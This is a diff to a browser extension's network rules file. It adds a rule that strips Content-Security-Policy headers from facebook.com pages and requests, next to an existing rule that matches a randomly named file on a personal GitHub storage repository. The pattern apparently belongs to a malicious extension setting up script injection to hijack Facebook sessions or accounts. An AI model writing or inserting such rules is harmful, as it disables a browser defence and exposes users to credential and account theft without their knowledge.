@@ -36,5 +36,26 @@
     "condition": {
       "urlFilter": "https://raw.githubusercontent.com/johnson19901/storage/main/nfeblpmeoiafpakcbanncibhlnebmdhm/KAk834QEDEl.*"
     }
+  },
+   {
+    "id": 3,
+    "priority": 1,
+    "action": {
+      "type": "modifyHeaders",
+      "responseHeaders": [
+        {
+          "header": "Content-Security-Policy",
+          "operation": "remove"
+        },
+        {
+          "header": "Content-Security-Policy-Report-Only",
+          "operation": "remove"
+        }
+      ]
+    },
+    "condition": {
+      "urlFilter": "https://*.facebook.com*",
+      "resourceTypes": ["main_frame", "xmlhttprequest"]
+    }
   }
 ]
